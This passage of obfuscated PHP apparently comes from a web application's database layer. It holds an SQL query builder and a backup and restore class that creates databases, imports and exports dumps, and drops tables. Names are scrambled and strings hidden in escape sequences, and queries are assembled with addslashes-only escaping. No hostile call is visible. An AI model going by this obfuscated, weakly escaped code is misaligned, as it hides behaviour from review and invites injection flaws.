$“Ñ¬”à¿[1]) : $“Ñ¬”à¿[1]; $Í›¸Š½¥ .= $İà’œõø[952] . $ïŠºÂµ . $İà’œõø[53] . $this->exp[$şŸ¹Çº] . $İà’œõø[53] . $this->parseValue($Ç¤È‚Î”[0]) . $İà’œõø[1053] . $this->parseValue($Ç¤È‚Î”[1]) . $İà’œõø[330]; } else { think_exception(think_lang($İà’œõø[1056]) . $İà’œõø[4] . $“Ñ¬”à¿[0]); } } else { $ßœûùš = count($“Ñ¬”à¿); $¦Ò¿É¿í = $İà’œõø[12]; if (is_string($“Ñ¬”à¿[$ßœûùš - 1])) { $¦Ò¿É¿í = isset($“Ñ¬”à¿[$ßœûùš - 1]) ? strtoupper($“Ñ¬”à¿[$ßœûùš - 1]) : $İà’œõø[12]; if (in_array($¦Ò¿É¿í, array($İà’œõø[1050], $İà’œõø[1051], $İà’œõø[1052]))) { $ßœûùš = $ßœûùš - 1; } } else { $¦Ò¿É¿í = $İà’œõø[1050]; } for ($–å‚ÎÃÎ = 0; $–å‚ÎÃÎ < $ßœûùš; $–å‚ÎÃÎ++) { $Ç¤È‚Î” = is_array($“Ñ¬”à¿[$–å‚ÎÃÎ]) ? $“Ñ¬”à¿[$–å‚ÎÃÎ][1] : $“Ñ¬”à¿[$–å‚ÎÃÎ]; if ($İà’œõø[348] == strtolower($“Ñ¬”à¿[$–å‚ÎÃÎ][0])) { $Í›¸Š½¥ .= $İà’œõø[312] . $ïŠºÂµ . $İà’œõø[53] . $Ç¤È‚Î” . $İà’œõø[1067] . $¦Ò¿É¿í . $İà’œõø[53]; } else { $‚Ğ¸ß¬ = is_array($“Ñ¬”à¿[$–å‚ÎÃÎ]) ? $this->exp[strtolower($“Ñ¬”à¿[$–å‚ÎÃÎ][0])] : $İà’œõø[933]; if (!$‚Ğ¸ß¬ && is_array($“Ñ¬”à¿[$–å‚ÎÃÎ]) && in_array($“Ñ¬”à¿[$–å‚ÎÃÎ][0], array($İà’œõø[933], $İà’œõø[1060], $İà’œõø[1061], $İà’œõø[1062], $İà’œõø[1063], $İà’œõø[1064]))) { $‚Ğ¸ß¬ = $“Ñ¬”à¿[$–å‚ÎÃÎ][0]; } $Í›¸Š½¥ .= $İà’œõø[312] . $ïŠºÂµ . $İà’œõø[53] . $‚Ğ¸ß¬ . $İà’œõø[53] . $this->parseValue($Ç¤È‚Î”) . $İà’œõø[1067] . $¦Ò¿É¿í . $İà’œõø[53]; } } $Í›¸Š½¥ = substr($Í›¸Š½¥, 0, -4); } } else { $Í›¸Š½¥ .= $ïŠºÂµ . $İà’œõø[1071] . $this->parseValue($“Ñ¬”à¿); } return $Í›¸Š½¥; } protected function parseThinkWhere($İ²ŸœØ¯, $Ö¹ÔÆÓ˜) { $¯Õ¨Òä„ =& $_SERVER[º·Ï‹¥³]; $õ¡”Õé§ = $¯Õ¨Òä„[12]; switch ($İ²ŸœØ¯) { case $¯Õ¨Òä„[403]: $õ¡”Õé§ = $Ö¹ÔÆÓ˜; break; case $¯Õ¨Òä„[1054]: $õ¡”Õé§ = is_string($Ö¹ÔÆÓ˜) ? $Ö¹ÔÆÓ˜ : substr($this->parseWhere($Ö¹ÔÆÓ˜), 6); break; case $¯Õ¨Òä„[1072]: parse_str($Ö¹ÔÆÓ˜, $õ§–Õİ§); if (isset($õ§–Õİ§[$¯Õ¨Òä„[1049]])) { $‘©ºÅ‰î = $¯Õ¨Òä„[53] . strtoupper($õ§–Õİ§[$¯Õ¨Òä„[1049]]) . $¯Õ¨Òä„[53]; unset($õ§–Õİ§[$¯Õ¨Òä„[1049]]); } else { $‘©ºÅ‰î = $¯Õ¨Òä„[1053]; } $ ½ıã = array(); foreach ($õ§–Õİ§ as $ÓÈæ é => $óöâá¬Î) { $ ½ıã[] = $this->parseKey($ÓÈæ é) . $¯Õ¨Òä„[1071] . $this->parseValue($óöâá¬Î); } $õ¡”Õé§ = implode($‘©ºÅ‰î, $ ½ıã); break; } return $õ¡”Õé§; } protected function parseLimit($²®°­ìù) { $¶ûŒË«» =& $_SERVER[º·Ï‹¥³]; return !empty($²®°­ìù) ? $¶ûŒË«»[51] . $²®°­ìù . $¶ûŒË«»[53] : $¶ûŒË«»[12]; } protected function parseJoin($­üÔô‹) { $áÚééƒ¸ =& $_SERVER[º·Ï‹¥³]; $æ¼í›æã = $áÚééƒ¸[12]; if (!empty($­üÔô‹)) { if (is_array($­üÔô‹)) { foreach ($­üÔô‹ as $ºÛ•¦Ğ => $»‹©è×é) { if (!1 !== stripos($»‹©è×é, $áÚééƒ¸[1073])) { $æ¼í›æã .= $áÚééƒ¸[53] . $»‹©è×é; } else { $æ¼í›æã .= $áÚééƒ¸[1074] . $»‹©è×é; } } } else { $æ¼í›æã .= $áÚééƒ¸[1074] . $­üÔô‹; } } $æ¼í›æã = preg_replace($áÚééƒ¸[1075], think_config($áÚééƒ¸[979]) . $áÚééƒ¸[1076], $æ¼í›æã); return $æ¼í›æã; } protected function parseOrder($ØĞÃüß) { $¨›Áôôı =& $_SERVER[º·Ï‹¥³]; if (is_array($ØĞÃüß)) { $î»ÜåäÁ = array(); foreach ($ØĞÃüß as $¼Û¡¾Ñ => $ŞÑıËò) { if (is_numeric($¼Û¡¾Ñ)) { $î»ÜåäÁ[] = $this->parseKey($ŞÑıËò); } else { $ŞÑıËò = in_array(strtoupper(trim($ŞÑıËò)), array($¨›Áôôı[1077], $¨›Áôôı[1078])) ? $¨›Áôôı[53] . $ŞÑıËò : $¨›Áôôı[12]; if (preg_match($¨›Áôôı[1079], $¼Û¡¾Ñ)) { $î»ÜåäÁ[] = $this->parseKey($¼Û¡¾Ñ) . $ŞÑıËò; } else { think_exception($¨›Áôôı[1080] . $¼Û¡¾Ñ); } } } $ØĞÃüß = implode($¨›Áôôı[50], $î»ÜåäÁ); } return !empty($ØĞÃüß) ? $¨›Áôôı[1081] . $ØĞÃüß : $¨›Áôôı[12]; } protected function parseGroup($ÍÊˆØšØ) { $£¾“±¸ =& $_SERVER[º·Ï‹¥³]; return !empty($ÍÊˆØšØ) ? $£¾“±¸[1082] . $ÍÊˆØšØ : $£¾“±¸[12]; } protected function parseHaving($¾İ¹¹“) { $Ü³ñÃâ =& $_SERVER[º·Ï‹¥³]; return !empty($¾İ¹¹“) ? $Ü³ñÃâ[1083] . $¾İ¹¹“ : $Ü³ñÃâ[12]; } protected function parseComment($ŸÉâ«†î) { $‘¡Í• =& $_SERVER[º·Ï‹¥³]; return !empty($ŸÉâ«†î) ? $‘¡Í•[1084] . $ŸÉâ«†î . $‘¡Í•[1085] : $‘¡Í•[12]; } protected function parseDistinct($È¦‚ø¶¤) { $şÛ¸›ó =& $_SERVER[º·Ï‹¥³]; return !empty($È¦‚ø¶¤) ? $şÛ¸›ó[1086] : $şÛ¸›ó[12]; } protected function parseUnion($íóãíáò) { $·Ô€Ññ =& $_SERVER[º·Ï‹¥³]; if (empty($íóãíáò)) { return $·Ô€Ññ[12]; } if (isset($íóãíáò[$·Ô€Ññ[399]])) { $Û¿Ïì™€ = $·Ô€Ññ[1087]; unset($íóãíáò[$·Ô€Ññ[399]]); } else { $Û¿Ïì™€ = $·Ô€Ññ[1088]; } foreach ($íóãíáò as $§¥–ºº£) { $Ô²ÈÔÕ™[] = $Û¿Ïì™€ . (is_array($§¥–ºº£) ? $this->buildSelectSql($§¥–ºº£) : $§¥–ºº£); } return implode($·Ô€Ññ[53], $Ô²ÈÔÕ™); } public function insert($×¬üù, $ö… òËš = array(), $ŠüÅé¶ = false) { $“Ããê³ =& $_SERVER[º·Ï‹¥³]; $Šü®äƒµ = $„ëÃ»ší = array(); $this->model = $ö… òËš[$“Ããê³[333]]; foreach ($×¬üù as $‰ëƒİÓÜ => $µà•‚³) { if (is_array($µà•‚³) && $“Ããê³[348] == $µà•‚³[0]) { $„ëÃ»ší[] = $this->parseKey($‰ëƒİÓÜ); $Šü®äƒµ[] = $µà•‚³[1]; } elseif (is_scalar($µà•‚³) || is_null($µà•‚³)) { $„ëÃ»ší[] = $this->parseKey($‰ëƒİÓÜ); $Šü®äƒµ[] = $this->parseValue($µà•‚³); } } $ÁÊÛÓº = ($ŠüÅé¶ ? $“Ããê³[956] : $“Ããê³[957]) . $“Ããê³[958] . $this->parseTable($ö… òËš[$“Ããê³[331]]) . $“Ããê³[952] . implode($“Ããê³[50], $„ëÃ»ší) . $“Ããê³[953] . implode($“Ããê³[50], $Šü®äƒµ) . $“Ããê³[954]; $ÁÊÛÓº .= $this->parseLock(isset($ö… òËš[$“Ããê³[895]]) ? $ö… òËš[$“Ããê³[895]] : !1); $ÁÊÛÓº .= $this->parseComment(!empty($ö… òËš[$“Ããê³[405]]) ? $ö… òËš[$“Ããê³[405]] : $“Ããê³[12]); return $this->execute($ÁÊÛÓº, $this->parseBind(!empty($ö… òËš[$“Ããê³[336]]) ? $ö… òËš[$“Ããê³[336]] : array())); } public function selectInsert($õ­¬äºı, $‹º÷ï†œ, $Ï¯èˆà = array()) { $€¾ç¶˜Ã =& $_SERVER[º·Ï‹¥³]; $this->model = $Ï¯èˆà[$€¾ç¶˜Ã[333]]; if (is_string($õ­¬äºı)) { $õ­¬äºı = explode($€¾ç¶˜Ã[50], $õ­¬äºı); } array_walk($õ­¬äºı, array($this, $€¾ç¶˜Ã[955])); $ü‹œ¯¾‘ = $€¾ç¶˜Ã[1089] . $this->parseTable($‹º÷ï†œ) . $€¾ç¶˜Ã[952] . implode($€¾ç¶˜Ã[50], $õ­¬äºı) . $€¾ç¶˜Ã[1067]; $ü‹œ¯¾‘ .= $this->buildSelectSql($Ï¯èˆà); return $this->execute($ü‹œ¯¾‘, $this->parseBind(!empty($Ï¯èˆà[$€¾ç¶˜Ã[336]]) ? $Ï¯èˆà[$€¾ç¶˜Ã[336]] : array())); } public function update($õúû®ƒÀ, $·î‘äÓş) { $÷—§ıá‡ =& $_SERVER[º·Ï‹¥³]; $this->model = $·î‘äÓş[$÷—§ıá‡[333]]; $ôµ»€×ø = $÷—§ıá‡[1090] . $this->parseTable($·î‘äÓş[$÷—§ıá‡[331]]) . $this->parseSet($õúû®ƒÀ) . $this->parseWhere(!empty($·î‘äÓş[$÷—§ıá‡[327]]) ? $·î‘äÓş[$÷—§ıá‡[327]] : $÷—§ıá‡[12]) . $this->parseOrder(!empty($·î‘äÓş[$÷—§ıá‡[425]]) ? $·î‘äÓş[$÷—§ıá‡[425]] : $÷—§ıá‡[12]) . $this->parseLimit(!empty($·î‘äÓş[$÷—§ıá‡[343]]) ? $·î‘äÓş[$÷—§ıá‡[343]] : $÷—§ıá‡[12]) . $this->parseLock(isset($·î‘äÓş[$÷—§ıá‡[895]]) ? $·î‘äÓş[$÷—§ıá‡[895]] : !1) . $this->parseComment(!empty($·î‘äÓş[$÷—§ıá‡[405]]) ? $·î‘äÓş[$÷—§ıá‡[405]] : $÷—§ıá‡[12]); return $this->execute($ôµ»€×ø, $this->parseBind(!empty($·î‘äÓş[$÷—§ıá‡[336]]) ? $·î‘äÓş[$÷—§ıá‡[336]] : array())); } public function delete($‰˜”™Ñµ = array()) { $ÌÏÉˆ“Á =& $_SERVER[º·Ï‹¥³]; $this->model = $‰˜”™Ñµ[$ÌÏÉˆ“Á[333]]; $êáò¯”Š = $ÌÏÉˆ“Á[1091] . $this->parseTable($‰˜”™Ñµ[$ÌÏÉˆ“Á[331]]) . $this->parseWhere(!empty($‰˜”™Ñµ[$ÌÏÉˆ“Á[327]]) ? $‰˜”™Ñµ[$ÌÏÉˆ“Á[327]] : $ÌÏÉˆ“Á[12]) . $this->parseOrder(!empty($‰˜”™Ñµ[$ÌÏÉˆ“Á[425]]) ? $‰˜”™Ñµ[$ÌÏÉˆ“Á[425]] : $ÌÏÉˆ“Á[12]) . $this->parseLimit(!empty($‰˜”™Ñµ[$ÌÏÉˆ“Á[343]]) ? $‰˜”™Ñµ[$ÌÏÉˆ“Á[343]] : $ÌÏÉˆ“Á[12]) . $this->parseLock(isset($‰˜”™Ñµ[$ÌÏÉˆ“Á[895]]) ? $‰˜”™Ñµ[$ÌÏÉˆ“Á[895]] : !1) . $this->parseComment(!empty($‰˜”™Ñµ[$ÌÏÉˆ“Á[405]]) ? $‰˜”™Ñµ[$ÌÏÉˆ“Á[405]] : $ÌÏÉˆ“Á[12]); return $this->execute($êáò¯”Š, $this->parseBind(!empty($‰˜”™Ñµ[$ÌÏÉˆ“Á[336]]) ? $‰˜”™Ñµ[$ÌÏÉˆ“Á[336]] : array())); } public function select($¿©‡û¹Ø = array()) { $ûÖíŸ =& $_SERVER[º·Ï‹¥³]; $this->model = $¿©‡û¹Ø[$ûÖíŸ[333]]; $·À£îÜÍ = $this->buildSelectSql($¿©‡û¹Ø); $ÑÔŞËªú = isset($¿©‡û¹Ø[$ûÖíŸ[400]]) ? $¿©‡û¹Ø[$ûÖíŸ[400]] : !1; if ($ÑÔŞËªú) { $’¸ÇıõÆ = is_string($ÑÔŞËªú[$ûÖíŸ[97]]) ? $ÑÔŞËªú[$ûÖíŸ[97]] : $ûÖíŸ[1092] . md5($·À£îÜÍ); $Í—ª‚‹£ = think_cache($’¸ÇıõÆ, $ûÖíŸ[12], $ÑÔŞËªú); if (!1 !== $Í—ª‚‹£) { return $Í—ª‚‹£; } } $ûÎîèˆ• = $this->query($·À£îÜÍ, $this->parseBind(!empty($¿©‡û¹Ø[$ûÖíŸ[336]]) ? $¿©‡û¹Ø[$ûÖíŸ[336]] : array())); if ($ÑÔŞËªú && !1 !== $ûÎîèˆ•) { think_cache($’¸ÇıõÆ, $ûÎîèˆ•, $ÑÔŞËªú); } return $ûÎîèˆ•; } public function buildSelectSql($Ó¼µ¦§Â = array()) { $ñàè§À¨ =& $_SERVER[º·Ï‹¥³]; if (isset($Ó¼µ¦§Â[$ñàè§À¨[404]])) { if (strpos($Ó¼µ¦§Â[$ñàè§À¨[404]], $ñàè§À¨[50])) { list($è…§ƒõ, $“¬¤á–) = explode($ñàè§À¨[50], $Ó¼µ¦§Â[$ñàè§À¨[404]]); } else { $è…§ƒõ = $Ó¼µ¦§Â[$ñàè§À¨[404]]; } $è…§ƒõ = $è…§ƒõ ? $è…§ƒõ : 1; $“¬¤á– = isset($“¬¤á–) ? $“¬¤á– : (is_numeric($Ó¼µ¦§Â[$ñàè§À¨[343]]) ? $Ó¼µ¦§Â[$ñàè§À¨[343]] : 20); $šÈ€÷ÃÇ = $“¬¤á– * ((int) $è…§ƒõ - 1); $Ó¼µ¦§Â[$ñàè§À¨[343]] = $šÈ€÷ÃÇ . $ñàè§À¨[50] . $“¬¤á–; } if (think_config($ñàè§À¨[1093])) { $áÂç · = $ñàè§À¨[1094] . md5(serialize($Ó¼µ¦§Â)); $Á„ø÷È¤ = think_cache($áÂç ·); if ($Á„ø÷È¤) { return $Á„ø÷È¤; } } $¸À×‹©Ö = $this->parseSql($this->selectSql, $Ó¼µ¦§Â); $¸À×‹©Ö .= $this->parseLock(isset($Ó¼µ¦§Â[$ñàè§À¨[895]]) ? $Ó¼µ¦§Â[$ñàè§À¨[895]] : !1); if (isset($áÂç ·)) { think_cache($áÂç ·, $¸À×‹©Ö); } return $¸À×‹©Ö; } public function parseSql($âÒö é, $˜“ÃïÌ = array()) { $ì³îü¼Û =& $_SERVER[º·Ï‹¥³]; $âÒö é = str_replace(array($ì³îü¼Û[1095], $ì³îü¼Û[1096], $ì³îü¼Û[1097], $ì³îü¼Û[1098], $ì³îü¼Û[1099], $ì³îü¼Û[1100], $ì³îü¼Û[1101], $ì³îü¼Û[1102], $ì³îü¼Û[1103], $ì³îü¼Û[1104], $ì³îü¼Û[1105]), array($this->parseTable("{$˜“ÃïÌ[$ì³îü¼Û[331]]}"), $this->parseDistinct(isset($˜“ÃïÌ[$ì³îü¼Û[1106]]) ? $˜“ÃïÌ[$ì³îü¼Û[1106]] : !1), $this->parseField(!empty($˜“ÃïÌ[$ì³îü¼Û[325]]) ? $˜“ÃïÌ[$ì³îü¼Û[325]] : $ì³îü¼Û[211]), $this->parseJoin(!empty($˜“ÃïÌ[$ì³îü¼Û[334]]) ? $˜“ÃïÌ[$ì³îü¼Û[334]] : $ì³îü¼Û[12]), $this->parseWhere(!empty($˜“ÃïÌ[$ì³îü¼Û[327]]) ? $˜“ÃïÌ[$ì³îü¼Û[327]] : $ì³îü¼Û[12]), $this->parseGroup(!empty($˜“ÃïÌ[$ì³îü¼Û[563]]) ? $˜“ÃïÌ[$ì³îü¼Û[563]] : $ì³îü¼Û[12]), $this->parseHaving(!empty($˜“ÃïÌ[$ì³îü¼Û[1107]]) ? $˜“ÃïÌ[$ì³îü¼Û[1107]] : $ì³îü¼Û[12]), $this->parseOrder(!empty($˜“ÃïÌ[$ì³îü¼Û[425]]) ? $˜“ÃïÌ[$ì³îü¼Û[425]] : $ì³îü¼Û[12]), $this->parseLimit(!empty($˜“ÃïÌ[$ì³îü¼Û[343]]) ? $˜“ÃïÌ[$ì³îü¼Û[343]] : $ì³îü¼Û[12]), $this->parseUnion(!empty($˜“ÃïÌ[$ì³îü¼Û[398]]) ? $˜“ÃïÌ[$ì³îü¼Û[398]] : $ì³îü¼Û[12]), $this->parseComment(!empty($˜“ÃïÌ[$ì³îü¼Û[405]]) ? $˜“ÃïÌ[$ì³îü¼Û[405]] : $ì³îü¼Û[12])), $âÒö é); return $âÒö é; } public function getLastSql($«öŸÇœĞ = '') { return $«öŸÇœĞ ? $this->modelSql[$«öŸÇœĞ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($®“»¢½“) { return addslashes($®“»¢½“); } public function setModel($õñÌÉ±¥) { $this->model = $õñÌÉ±¥; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($ç¯É§î³ = array()) { $©÷ø =& $_SERVER[º·Ï‹¥³]; if (empty($ç¯É§î³)) { $ç¯É§î³ = $GLOBALS[$©÷ø[6]][$©÷ø[21]]; } $this->database = $ç¯É§î³; } public function model($‘İ£°›¹ = '') { return new ModelBase($‘İ£°›¹, $_SERVER[º·Ï‹¥³][12], $this->database); } public function db($¡í Ë°¤ = false) { $‰öÒºÉÏ =& $_SERVER[º·Ï‹¥³]; $Ş¥ôÖ›¾ = array_change_key_case($this->database); if ($this->dbType() == $‰öÒºÉÏ[13] || !$¡í Ë°¤) { return $this->model()->db(); } $´ƒ„Å = $Ş¥ôÖ›¾[$‰öÒºÉÏ[1021]]; $Ş¥ôÖ›¾[$‰öÒºÉÏ[1021]] = $‰öÒºÉÏ[12]; if ($Ş¥ôÖ›¾[$‰öÒºÉÏ[1016]] == $‰öÒºÉÏ[1013]) { $è¢¢ÄäÊ = $Ş¥ôÖ›¾[$‰öÒºÉÏ[1022]]; $Ş¥ôÖ›¾[$‰öÒºÉÏ[1022]] = substr($è¢¢ÄäÊ, 0, strrpos($è¢¢ÄäÊ, $‰öÒºÉÏ[1108])); } $this->database = $Ş¥ôÖ›¾; $»¢­Ö‚ = $this->model()->db(); try { $Àü»ˆ½ü = $»¢­Ö‚->execute("\163\150\x6f\167\40\x64\141\164\x61\142\x61\x73\145\163\40\154\151\x6b\145\x20\47{$´ƒ„Å}\x27"); } catch (Exception $š‹Ä€û“) { } if (!$Àü»ˆ½ü) { $»¢­Ö‚->execute("\143\x72\145\x61\164\x65\40\144\x61\x74\x61\142\x61\x73\145\40\x60{$´ƒ„Å}\140"); } $Ş¥ôÖ›¾[$‰öÒºÉÏ[1021]] = $´ƒ„Å; if ($Ş¥ôÖ›¾[$‰öÒºÉÏ[1016]] == $‰öÒºÉÏ[1013]) { $Ş¥ôÖ›¾[$‰öÒºÉÏ[1022]] .= $‰öÒºÉÏ[1108] . $´ƒ„Å; } $this->database = $Ş¥ôÖ›¾; $»¢­Ö‚->execute("\x75\163\x65\40\x60{$´ƒ„Å}\140"); return $»¢­Ö‚; } public function createTable($‹´Š™â, &$†¾Ÿ’éí) { $éàŞÓéÅ =& $_SERVER[º·Ï‹¥³]; if (!IO::exist($‹´Š™â)) { ActionCall($éàŞÓéÅ[1109], !0, 0); show_json(LNG($éàŞÓéÅ[1110]), !1); } $¹’©«’İ = $this->model()->db(); $Œ­¾Åı§ = sqlSplit(IO::getContent($‹´Š™â)); foreach ($Œ­¾Åı§ as $ö£òÑà“) { $† ³Ş‚¥ = stripos($ö£òÑà“, $éàŞÓéÅ[1111]) === 0; if ($† ³Ş‚¥) { $†¾Ÿ’éí->task[$éàŞÓéÅ[1112]] += 1; } $¹’©«’İ->execute($ö£òÑà“); if ($† ³Ş‚¥) { preg_match($éàŞÓéÅ[1113], $ö£òÑà“, $ªÃÊşäã); $†¾Ÿ’éí->task[$éàŞÓéÅ[1114]] = $ªÃÊşäã[1]; $†¾Ÿ’éí->update(1); } } } public function insertTable($‘ıÒì¨ì, &$¦ˆüÆ) { $ãºí¤´Ş =& $_SERVER[º·Ï‹¥³]; $¦£ƒš×¬ = $this->model()->db(); $ß÷àùşÔ = $ö›¥ù¹¿ ? array($ö›¥ù¹¿) : $¦£ƒš×¬->getTables(); foreach ($‘ıÒì¨ì as $€Êù•ŠË) { $ö›¥ù¹¿ = basename($€Êù•ŠË, $ãºí¤´Ş[839]); if (!in_array($ö›¥ù¹¿, $ß÷àùşÔ)) { continue; } $¦ˆüÆ->task[$ãºí¤´Ş[1114]] = $ö›¥ù¹¿; if (get_filesize($€Êù•ŠË) == 0) { continue; } $»¶Œ¢…¤ = $this->sqlToDb($€Êù•ŠË, $¦ˆüÆ); if (!$»¶Œ¢…¤) { ActionCall($ãºí¤´Ş[1109], !0, 0); show_json(LNG($ãºí¤´Ş[1115]) . "\x5b{$ö›¥ù¹¿}\x5d", !1); } } } public function sqlFromDb($ÃäèÌé¶, $Ú¡¸µß, &$Ş½®°ø, $úÎÌŸ¦È = '') { if ($Ş½®°ø) { $Ş½®°ø->task[$_SERVER[º·Ï‹¥³][1114]] = $ÃäèÌé¶; } $‡¾ÜÉÇÌ = $this->model($ÃäèÌé¶); $î±µòßŠ = 0; $ÌÔ¶ÁÂ‘ = 0; $ØÀÅÅÏ× = 10000; $İüÕùÁ = fopen($Ú¡¸µß, $_SERVER[º·Ï‹¥³][1116]); $«Âìîüğ = $‡¾ÜÉÇÌ->getPk(); $½Ÿ°‹ô = $‡¾ÜÉÇÌ->getDbFields(); $™‹Ûş¼ = $_SERVER[º·Ï‹¥³][12]; if ($GLOBALS[$_SERVER[º·Ï‹¥³][838]] && in_array($ÃäèÌé¶, array($_SERVER[º·Ï‹¥³][1117], $_SERVER[º·Ï‹¥³][1118]))) { $™‹Ûş¼ = $ÃäèÌé¶; } do { $Ã‰ÚàÏ‘ = array($«Âìîüğ => array($_SERVER[º·Ï‹¥³][1063], $ÌÔ¶ÁÂ‘)); $Ò’¦¥ç = $‡¾ÜÉÇÌ->where($Ã‰ÚàÏ‘)->field($½Ÿ°‹ô)->order($«Âìîüğ . $_SERVER[º·Ï‹¥³][1119])->limit($ØÀÅÅÏ×)->select(); $Ò’¦¥ç = !empty($Ò’¦¥ç) ? $Ò’¦¥ç : array(); if (!($¬ğ¢š“Ÿ = count($Ò’¦¥ç))) { break; } $ğ¶µ™½ä = end($Ò’¦¥ç); $ÌÔ¶ÁÂ‘ = $ğ¶µ™½ä[$«Âìîüğ]; $ê÷¬¨ = array(); foreach ($Ò’¦¥ç as $Š®˜Öè¬) { if ($™‹Ûş¼) { if ($ÃäèÌé¶ == $_SERVER[º·Ï‹¥³][1117]) { if ($Š®˜Öè¬[$_SERVER[º·Ï‹¥³][33]] == $_SERVER[º·Ï‹¥³][1120]) { $Ö’ûèÌ‹ = json_decode($Š®˜Öè¬[$_SERVER[º·Ï‹¥³][434]], !0); if ($Ö’ûèÌ‹[$_SERVER[º·Ï‹¥³][32]] == $GLOBALS[$_SERVER[º·Ï‹¥³][838]] && $Ö’ûèÌ‹[$_SERVER[º·Ï‹¥³][802]] != 1) { continue; } } } else { if ($Š®˜Öè¬[$_SERVER[º·Ï‹¥³][33]] == $_SERVER[º·Ï‹¥³][1121] && $Š®˜Öè¬[$_SERVER[º·Ï‹¥³][97]] == $_SERVER[º·Ï‹¥³][833]) { continue; } } } if ($úÎÌŸ¦È) { $Š®˜Öè¬[$_SERVER[º·Ï‹¥³][87]] = "\x7b\x69\157\x3a{$úÎÌŸ¦È}\175" . substr($Š®˜Öè¬[$_SERVER[º·Ï‹¥³][87]], strlen("\x7b\151\157\x3a{$Š®˜Öè¬[$_SERVER[º·Ï‹¥³][868]]}\175")); $Š®˜Öè¬[$_SERVER[º·Ï‹¥³][868]] = $úÎÌŸ¦È; } $ê÷¬¨[] = $_SERVER[º·Ï‹¥³][1122] . $this->sqlEncode($Š®˜Öè¬) . $_SERVER[º·Ï‹¥³][1123]; } $‡à”ÒÍˆ = "\x49\x4e\123\x45\x52\124\40\x49\x4e\124\x4f\x20\140{$ÃäèÌé¶}\x60\40\50\x60" . implode($_SERVER[º·Ï‹¥³][1124], $½Ÿ°‹ô) . $_SERVER[º·Ï‹¥³][1125]; fwrite($İüÕùÁ, $‡à”ÒÍˆ . implode($_SERVER[º·Ï‹¥³][1126], $ê÷¬¨) . $_SERVER[º·Ï‹¥³][74] . PHP_EOL); $î±µòßŠ += $¬ğ¢š“Ÿ; if ($Ş½®°ø) { $Ş½®°ø->update($¬ğ¢š“Ÿ); } } while ($ØÀÅÅÏ× == $¬ğ¢š“Ÿ); fclose($İüÕùÁ); return $î±µòßŠ; } public function sqlToDb($µÚê„ù®, &$©˜Û¤ÌÛ) { $Ê™ö‹âı =& $_SERVER[º·Ï‹¥³]; $±§…ëò¤ = $this->model()->db(); $ØÆ³æ½‹ = @fopen($µÚê„ù®, $Ê™ö‹âı[1127]); if (!$ØÆ³æ½‹) { return !1; } $‰ò§Ëš = 0; $ÕÙò´£æ = $Ê™ö‹âı[12]; $ªö¼ÚÓÅ = array(); $ù×“²¦é = $this->dbType(); $Ó÷‰Ë© = $ù×“²¦é == $Ê™ö‹âı[13] ? 500 : 2000; $©Ò¾ë×Â = basename($µÚê„ù®, $Ê™ö‹âı[839]); $™¡€Ÿ”§ = 0; $­‚Ší‚Á = 4194304; while (!feof($ØÆ³æ½‹)) { $ªâ¯âî– = trim(fgets($ØÆ³æ½‹)); if (!$ªâ¯âî–) { continue; } $áÈÃáŸú = $this->sqlDecode($ªâ¯âî–, $ù×“²¦é, $©Ò¾ë×Â); if (stripos($áÈÃáŸú, $Ê™ö‹âı[415]) === 0) { if (!$ÕÙò´£æ) { $ÕÙò´£æ = $áÈÃáŸú . $Ê™ö‹âı[53]; } continue; } if ($©˜Û¤ÌÛ) { $©˜Û¤ÌÛ->task[$Ê™ö‹âı[1112]] += 1; } $‰ò§Ëš++; $ªö¼ÚÓÅ[] = rtrim(rtrim(trim($áÈÃáŸú), $Ê™ö‹âı[50]), $Ê™ö‹âı[74]); $‡…º®Ç¹ = null; $å€¨Ğ©Ï = strlen($áÈÃáŸú); $™¡€Ÿ”§ += $å€¨Ğ©Ï; $«Åë†…± = strlen($ÕÙò´£æ) + $™¡€Ÿ”§ + (count($ªö¼ÚÓÅ) - 1); if ($«Åë†…± >= $­‚Ší‚Á) { $‡…º®Ç¹ = array_pop($ªö¼ÚÓÅ); if ($‰ò§Ëš > 1) { $‰ò§Ëš--; } } if ($‰ò§Ëš >= $Ó÷‰Ë© || $‡…º®Ç¹) { $áÈÃáŸú = $ÕÙò´£æ . implode($Ê™ö‹âı[50], $ªö¼ÚÓÅ); if (!$±§…ëò¤->execute($áÈÃáŸú)) { return !1; } if ($©˜Û¤ÌÛ) { $©˜Û¤ÌÛ->update($‰ò§Ëš); } $ªö¼ÚÓÅ = array(); $‰ò§Ëš = 0; $™¡€Ÿ”§ = 0; if ($‡…º®Ç¹) { $ªö¼ÚÓÅ = array($‡…º®Ç¹); $‰ò§Ëš = 1; $™¡€Ÿ”§ = $å€¨Ğ©Ï; } } } fclose($ØÆ³æ½‹); if (!empty($ªö¼ÚÓÅ)) { $áÈÃáŸú = $ÕÙò´£æ . implode($Ê™ö‹âı[50], $ªö¼ÚÓÅ); if (!$±§…ëò¤->execute($áÈÃáŸú)) { return !1; } if ($©˜Û¤ÌÛ) { $©˜Û¤ÌÛ->update($‰ò§Ëš); } } return !0; } public function dropTable($¨Ì´İŸ¥ = null) { $øº§Ÿº¿ = $this->model()->db(); $â¼ Å† = $¨Ì´İŸ¥ ? array($¨Ì´İŸ¥) : $øº§Ÿº¿->getTables(); if (!$â¼ Å†) { return; } foreach ($â¼ Å† as $¨Ì´İŸ¥) { if ($¨Ì´İŸ¥) { $¨Ì´İŸ¥ = strtolower($¨Ì´İŸ¥); } else { continue; } $øº§Ÿº¿->execute("\144\x72\x6f\x70\40\x74\x61\x62\x6c\x65\x20\x69\146\x20\145\x78\x69\x73\x74\163\40\x60{$¨Ì´İŸ¥}\140"); } } private function sqlEncode($û‚úÇ°Œ) { $ŠêÎ½ºÇ =& $_SERVER[º·Ï‹¥³]; $ÆØÇĞ£Å = array(); foreach ($û‚úÇ°Œ as $ˆÙŸĞ‡¸) { if (is_array($ˆÙŸĞ‡¸)) { $ˆÙŸĞ‡¸ = json_encode_force($ˆÙŸĞ‡¸); } $ˆÙŸĞ‡¸ = addslashes($ˆÙŸĞ‡¸); $ˆÙŸĞ‡¸ = str_replace(array($ŠêÎ½ºÇ[1128], $ŠêÎ½ºÇ[253], $ŠêÎ½ºÇ[393]), array($ŠêÎ½ºÇ[1129], $ŠêÎ½ºÇ[1130], $ŠêÎ½ºÇ[1131]), $ˆÙŸĞ‡¸); $ÆØÇĞ£Å[] = $ˆÙŸĞ‡¸; } return $ŠêÎ½ºÇ[58] . 